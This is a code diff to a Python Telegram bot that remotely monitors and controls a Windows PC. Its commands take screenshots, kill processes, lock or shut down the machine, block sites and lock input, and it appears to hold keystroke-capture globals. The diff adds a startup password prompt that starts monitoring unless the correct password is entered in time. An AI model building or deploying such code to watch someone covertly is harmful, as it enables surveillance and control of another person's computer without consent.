@@ -1,4 +1,3 @@
-
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 import json
@@ -17,6 +16,10 @@ import socket
 import requests
 import ctypes
 from telegram.error import TimedOut, NetworkError
+import sys
+import time
+import tkinter as tk
+import threading
 
 async def safe_send_message(bot, chat_id, text):
     try:
@@ -30,6 +33,92 @@ async def safe_send_message(bot, chat_id, text):
     except Exception as e:
         print(f"Unexpected Telegram error: {e}")
 
+monitoring = True
+
+# === Load config ===
+if getattr(sys, 'frozen', False):
+    base_path = sys._MEIPASS
+else:
+    base_path = os.path.dirname(__file__)
+
+config_path = os.path.join(base_path, "config.json")
+with open(config_path, "r") as f:
+    config = json.load(f)
+
+correct_password = config["pass"]
+chat_id = config["chat_id"]
+bot_token = config["tele_token"]
+
+# === Password Prompt Class ===
+class PasswordPrompt:
+    def __init__(self, timeout=30):
+        self.timeout = timeout
+        self.correct = False
+
+        self.root = tk.Tk()
+        self.root.title("🔐 Authentication Required")
+        self.root.geometry("300x150")
+        self.root.resizable(False, False)
+        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
+
+        self.label = tk.Label(self.root, text="Enter password to stop monitoring:")
+        self.label.pack(pady=(10, 0))
+
+        self.entry = tk.Entry(self.root, show="*")
+        self.entry.pack(pady=5)
+        self.entry.focus()
+
+        self.submit_btn = tk.Button(self.root, text="Submit", command=self.check_password)
+        self.submit_btn.pack(pady=(5, 10))
+
+        self.timer_label = tk.Label(self.root, text=f"⏳ Time remaining: {self.timeout}s")
+        self.timer_label.pack()
+
+        self.remaining = self.timeout
+        self.update_timer()
+
+    def check_password(self):
+        if self.entry.get() == correct_password:
+            self.correct = True
+        self.root.destroy()
+
+    def update_timer(self):
+        if self.remaining > 0:
+            if self.is_minimized():
+                print("❌ Prompt minimized.")
+                self.root.destroy()
+                return
+            self.timer_label.config(text=f"⏳ Time remaining: {self.remaining}s")
+            self.remaining -= 1
+            self.root.after(1000, self.update_timer)
+        else:
+            self.root.destroy()
+
+    def is_minimized(self):
+        hwnd = win32gui.GetForegroundWindow()
+        return win32gui.IsIconic(hwnd)
+
+    def on_close(self):
+        self.root.destroy()
+
+    def run(self):
+        self.root.mainloop()
+        return self.correct
+    
+# === Run Prompt ===
+if PasswordPrompt(timeout=30).run():
+    print("✅ Password correct. Exiting monitor.")
+    sys.exit(0)
+
+# === Password wrong or skipped ===
+print("❌ Access denied or skipped. Starting monitoring...")
+
+# Simulate monitoring activity
+for i in range(5):
+    print(f"Monitoring... ({i+1})")
+    time.sleep(1)
+
+print("✅ Monitor is running.")
 
 # === Globals ===
 klstopev = None
@@ -41,17 +130,22 @@ pressed_keys = set()
 print("🟢 monitor.py has started")
 
 # Load config
-with open("config.json", "r") as f:
-    config = json.load(f)
+try:
+    with open(config_path, "r") as f:
+        config = json.load(f)
+except Exception as e:
+    print(f"Config load failed: {e}")
+    sys.exit(1)
 
 BOT_TOKEN = config["tele_token"]
-
 
 system_processes = [
         "System Idle Process", "System", "Registry", "smss.exe", "csrss.exe", "wininit.exe",
         "services.exe", "winlogon.exe", "fontdrvhost.exe", "svchost.exe", "lsass.exe", "LsaIso.exe",
         "dwm.exe", "WUDFHost.exe", "RuntimeBroker.exe", "conhost.exe", "fontdrvhost.exe"
     ]
+
+
 
 # Correctly named command handler
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -70,6 +164,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/ip\n"
         "/linp\n"
         "/bsite\n"
+        "/stop"
     )
 #takes a screenshot
 async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -88,7 +183,6 @@ async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.remove(image_path)
 
 # === task manager comands ===
-
 async def tm_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🧠 Task Manager Options:\n\n"
@@ -172,7 +266,6 @@ async def shall(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(procs)
 
 # === kill apps ===
-
 async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         if not context.args:
@@ -196,7 +289,6 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {e}")    
 
 # === lock and sleep ===
-
 async def lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
@@ -212,7 +304,6 @@ async def sleep(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Failed to sleep: {e}")
 
 # === shutdown restart ===
-
 async def sr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🧠 Task Manager Options:\n\n"
@@ -365,11 +456,30 @@ async def blocksite(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Failed: {e}")
 
+async def stop_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global monitoring_active
+    user_id = update.effective_chat.id
+
+    # Optional: Restrict command to only the authorized user
+    if str(user_id) != str(config["chat_id"]):
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+
+    await update.message.reply_text("🛑 Monitoring stopped. Exiting program...")
+    monitoring_active = False
+
+    # Delay a moment to allow message delivery
+    await asyncio.sleep(1)
+
+    # Exit script after a brief delay
+    threading.Thread(target=lambda: (time.sleep(1), os._exit(0))).start()
+
 async def on_startup(app):
     try:
         await app.bot.send_message(chat_id=config["chat_id"], text="🖥️ PC has started and bot is online.")
     except Exception as e:
         print(f"Startup notification failed: {e}")
+
 
 
 app = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -391,6 +501,8 @@ app.add_handler(CommandHandler("net", network))
 app.add_handler(CommandHandler("ip", ipadd))
 app.add_handler(CommandHandler("linp", lockinput))
 app.add_handler(CommandHandler("bsite", blocksite))
+app.add_handler(CommandHandler("stop", stop_monitor))
+
 
 print("✅ Bot is running and listening...")
 
